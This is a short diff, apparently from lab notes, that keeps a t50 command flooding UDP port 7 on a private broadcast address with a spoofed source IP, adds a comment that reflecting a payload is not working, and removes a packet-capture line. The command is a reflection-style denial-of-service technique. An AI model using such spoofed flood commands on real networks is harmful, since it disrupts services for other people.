@@ -1,3 +1,2 @@
+# Can't put payload to reflect (Not Working)
 sudo t50 192.168.100.255 --protocol udp --dport 7 --saddr 192.168.100.2 --flood
-
-96172	1206.078582676	192.168.100.2	192.168.1.255	UDP	60	63890 → 7 Len=0
